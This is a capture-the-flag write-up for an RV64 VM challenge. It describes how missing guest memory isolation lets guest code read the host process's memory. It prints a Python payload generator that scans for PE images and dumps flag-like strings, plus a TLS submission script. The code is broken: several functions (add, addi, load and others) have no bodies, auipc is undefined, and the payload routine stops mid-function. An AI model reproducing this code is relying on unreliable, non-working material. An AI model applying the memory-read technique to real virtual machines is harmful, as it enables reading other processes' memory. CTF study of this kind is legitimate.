Executive Summary

DontRISCItJustYet is solved by exploiting the VM's lack of guest memory isolation. RV64 load/store operations can dereference native Windows process addresses, giving the guest code a process-memory read primitive.

The challenge hint gives a specific RVA, RV64VMv4.exe + 0x23cb, but the required exploit must be build agnostic. The submitted payload therefore does not use the RVA directly. It discovers loaded PE images dynamically, walks their readable sections, and prints bounded printable strings that look like flags. The remote wrapper returns stdout only when it contains the flag, so the printed flag line is selected automatically.

Vulnerability Analysis

The VM executes RV64IM instructions but does not implement an isolated guest address space. A guest address is effectively treated as a native pointer inside the Windows process. This makes guest load instructions capable of reading mapped PE images and guest store instructions capable of writing process memory.

The challenge-provided wrapper suppresses normal stdout and only returns output that contains the configured flag pattern. That behavior makes a bounded string dumper a practical final strategy: print candidate strings from readable PE sections and let the wrapper expose the flag line.

Build-agnostic requirementThe payload avoids base + 0x23cb. It derives PE ranges from the in-memory headers and scans sections marked readable.

Exploit Design

01Find candidate module pointersScan a controlled window near the VM context for aligned user-mode pointers.
02Validate PE imagesCheck MZ, e_lfanew, PE\0\0, section count, and image size.
03Walk sectionsUse VirtualAddress, VirtualSize, SizeOfRawData, and section characteristics.
04Emit candidatesPrint bounded printable strings containing braces; the wrapper returns the flag line.

The final payload is produced by make_aslr_exploit.py. It emits RV64 instructions directly. The relevant logic is:

  1. Recover the VM context from the payload position.
  2. Scan nearby process memory for values that look like loaded image bases.
  3. Validate each candidate as a PE image before reading section metadata.
  4. For readable sections, scan printable NUL-terminated strings.
  5. Restrict output to strings containing { and } to reduce noise.
  6. Exit with the VM exit syscall after scanning.

class Asm:
    def __init__(self):
        self.items = []

    def label(self, name):
        self.items.append(("label", name))

    def emit(self, word):
        self.items.append(("word", word))

    def branch(self, kind, rs1, rs2, label):
        self.items.append(("branch", kind, rs1, rs2, label))

    def jal(self, rd, label):
        self.items.append(("jal", rd, label))

    def pc(self):
        return 4 * sum(1 for item in self.items if item[0] != "label")

    def resolve(self):
        labels = {}
        pc = 0
        for item in self.items:
            if item[0] == "label":
                labels[item[1]] = pc
            else:
                pc += 4

        out = []
        pc = 0
        funct3 = {
            "beq": 0,
            "bne": 1,
            "blt": 4,
            "bge": 5,
            "bltu": 6,
            "bgeu": 7,
        }
        for item in self.items:
            if item[0] == "label":
                continue
            if item[0] == "word":
                out.append(item[1])
            elif item[0] == "branch":
                _, kind, rs1, rs2, label = item
                out.append(enc_b(labels[label] - pc, rs1, rs2, funct3[kind]))
            elif item[0] == "jal":
                _, rd, label = item
                out.append(enc_j(labels[label] - pc, rd))
            pc += 4
        return b"".join(struct.pack("<I", w) for w in out)


def enc_r(f7, rs2, rs1, f3, rd, opc=0x33):
    return (f7 << 25) | (rs2 << 20) | (rs1 << 15) | (f3 << 12) | (rd << 7) | opc


def enc_i(imm, rs1, f3, rd, opc=0x13):
    return ((imm & 0xFFF) << 20) | (rs1 << 15) | (f3 << 12) | (rd << 7) | opc


def enc_b(off, rs1, rs2, f3):
    if off % 2:
        raise ValueError("unaligned branch")
    imm = off
    return (
        (((imm >> 12) & 1) << 31)
        | (((imm >> 5) & 0x3F) << 25)
        | (rs2 << 20)
        | (rs1 << 15)
        | (f3 << 12)
        | (((imm >> 1) & 0xF) << 8)
        | (((imm >> 11) & 1) << 7)
        | 0x63
    )


def enc_u(imm20, rd, opc):
    return ((imm20 & 0xFFFFF) << 12) | (rd << 7) | opc


def enc_j(off, rd):
    if off % 2:
        raise ValueError("unaligned jal")
    imm = off
    return (
        (((imm >> 20) & 1) << 31)
        | (((imm >> 1) & 0x3FF) << 21)
        | (((imm >> 11) & 1) << 20)
        | (((imm >> 12) & 0xFF) << 12)
        | (rd << 7)
        | 0x6F
    )


def add(a, rd, rs1, rs2):

def sub(a, rd, rs1, rs2):

def addi(a, rd, rs1, imm):

def slli(a, rd, rs1, sh):

def srli(a, rd, rs1, sh):

def load(a, name, rd, rs1, imm):

def li(a, rd, val):
    if val == 0:
        addi(a, rd, X0, 0)
        return
    addi(a, rd, X0, 0)
    for ch in f"{val:x}":
        slli(a, rd, rd, 4)
        addi(a, rd, rd, int(ch, 16))


def add_large_offset(a, rd, base, offset):
    if offset == 0:
        add(a, rd, base, X0)
    elif offset < 0:
        li(a, T0, -offset)
        sub(a, rd, base, T0)
    else:
        li(a, T0, offset)
        add(a, rd, base, T0)


def emit_payload(scan_start, scan_size):
    a = Asm()

    # s0 = VM context. The VM stores the native payload pointer at context+0.
    auipc(a, S0, 0)
    addi(a, S0, S0, -0x110)

    # Scan a committed heap window below the context for aligned user-mode
    # module-base pointers. Every valid PE candidate is scanned, but output is
    # restricted to brace-delimited strings to avoid flooding on system DLLs.
    add_large_offset(a, S1, S0, scan_start)
    add_large_offset(a, S2, S1, scan_size)

    a.label("candidate_loop")
    a.branch("bgeu", S1, S2, "done")
    load(a, "ld", S3, S1, 0)

    # Windows image bases are 64 KiB aligned and in the 0x00007f.. range here.
    slli(a, T0, S3, 48)
    a.branch("bne", T0, X0, "next_candidate")
    srli(a, T0, S3, 40)
    li(a, T1, 0x7F)
    a.branch("bne", T0, T1, "next_candidate")

    # Validate MZ/PE before considering this qword a module base.
    load(a, "lhu", T0, S3, 0)
    li(a, T1, 0x5A4D)
    a.branch("bne", T0, T1, "next_candidate")

    load(a, "lwu", T0, S3, 0x3C)
    li(a, T1, 0x1000)
    a.branch("bgeu", T0, T1, "next_candidate")
    add(a, T1, S3, T0)
    load(a, "lwu", T2, T1, 0)
    li(a, T3, 0x4550)
    a.branch("bne", T2, T3, "next_candidate")

    load(a, "lhu", S5, T1, 0x06)

    load(a, "lwu", S4, T1, 0x50)

def default_payload_for(host: str) -> Path:

def recv_until_idle(sock: ssl.SSLSocket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def attempt(host: str, port: int, payload: bytes) -> str:
    context = ssl.create_default_context()
    with socket.create_connection((host, port), timeout=10) as raw_sock:
        with context.wrap_socket(raw_sock, server_hostname=host) as sock:
            banner = recv_until_idle(sock, 1.0)
            sock.sendall(payload)
            return (banner + recv_until_idle(sock, 15.0)).decode("utf-8", "ignore")


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    tries = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    payload_path = Path(sys.argv[4]) if len(sys.argv) > 4 else default_payload_for(host)
    payload = base64.b64encode(payload_path.read_bytes()) + b"\n"
    print(f"payload={payload_path} bytes={payload_path.stat().st_size}")

    for i in range(tries):
        try:
            text = attempt(host, port, payload)
        except OSError as exc:
            text = f"[connect error] {exc}"

        print(f"--- attempt {i + 1}/{tries} ---")
        print(text.replace("\x00", ""))

        match = re.search(r"OmniCTF\{[^}\n]*\}", text)
        if match:
            print(f"FLAG={match.group(0)}")
            return 0

        if "HTTP/1.1 400 Bad Request" in text or "404 page not found" in text:
            print("[!] Reached HTTP frontend, not the raw challenge backend.")
            return 2

        time.sleep(1)

    return 1


if __name__ == "__main__":
    raise SystemExit(main())
